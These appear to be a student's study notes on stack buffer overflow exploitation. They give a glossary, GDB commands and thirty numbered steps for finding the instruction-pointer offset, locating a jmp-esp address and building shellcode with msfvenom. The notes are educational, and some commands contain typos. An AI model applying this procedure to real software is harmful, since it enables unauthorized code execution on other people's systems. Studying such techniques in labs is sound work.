**Buffer Overflow common terms**:
	  
   	Heap: Memory that can be allocated and deallocated
	  
	  Stack: A contiguous section of memory used for passing arguments
	
	  Registers: Storage elements as close as possible to the central processing unit (CPU)
	  
	  Instruction Pointer (IP): a.k.a Program Counter (PC), contains the address of next instruction to be executed
	  
	  Stack Pointer (SP): Contains the address of the next available space on the stack
	  
	  Base Pointer (BP): The base of the stack
	  
	  Function: Code that is separate from the main program that is often used to replace code the repeats in order to make the program smaller and more efficient
	  
	  Shellcode: The code that is executed once an exploit successfully takes advantage of a vulnerability


  Common GDB commands:

   	disass <FUNCTION>   #   Disassemble portion of the program
	
	info <...>  #   Supply info for specific stack areas
	
	x/256c $<REGISTER>  #   Read characters from specific register

	break <address>  #   Establish a break point


(1) chmod u+x <name of executable>
(2) file <name of executable>
(3) strings <name of executable>
(4) run the program
(5) check if it takes arguments ./<filename> $(echo "asdsasdasdasd")
(6) see if it will take input ./<filename> <<< $(echo "asdsasdasdasd")
(7) for testing buffer overflow add more characters
(8) use nano to make a python script to make a script that can pass a specified number of characters
(9) make script executable and pass it as the input into the executable <filename> <<< $(./<scriptname>)
(10) gdb <filename> runs the debugger on it
(11) info functions to see all the functions of the program
(12) pdisass <function name> to dissasemble functions
(13) run <<< $(./<scriptname)
(14) **wiremask.eu** use it to find the start of the IP 
(15) send pattern into the executable use the value of the ip and put it into the website
(16) change the python script to the buffer value found out and to double check change the IP so you can see whether the IP is manipulated
(17) env - gdb ./func is used to pass the enviorment variables into it
(18) unset env <env variables>
(19) run the exe (run) overflow it
(20) info proc map to see address space and copy the locations of the start and end of the stack
(21) the line right below [heap] is the start and the last is the end addr on the [stack] line
(22) find /b 0xf7de1000 (start of stack), 0xffffe000 (end of stack), 0xff (jmp), 0xe4 (esp) (start and end location)
(23) grab a few addresses and make them into little eindian bytes (ex. 0xf7de3b59 -> \x59\x3b\xde\xf7)
(24) run msfdb init to inizilize the metasploit database 
(25) msfvenom -p linux/x86/exec CMD=whoami -b '\x00' -f python
*(26)  set cmd whoami && ifconfig
*(27) generate -b '\x00\' -f python 
(28) add the byte code to the script
(29) change the eip 
(30) run the executable
(31) 
